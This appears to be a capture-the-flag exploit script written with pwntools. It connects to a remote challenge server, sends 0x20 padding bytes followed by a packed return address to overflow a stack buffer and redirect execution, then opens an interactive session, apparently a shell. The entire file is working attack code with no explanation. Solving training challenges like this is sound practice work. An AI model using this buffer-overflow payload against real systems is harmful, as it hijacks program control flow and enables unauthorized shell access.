from pwn import *

host = 'csie.ctf.tw'
port = 10135
y = remote( host , port )

ad = 0x80484fd

y.sendline('a' * 0x20 + p32(ad))

y.interactive()
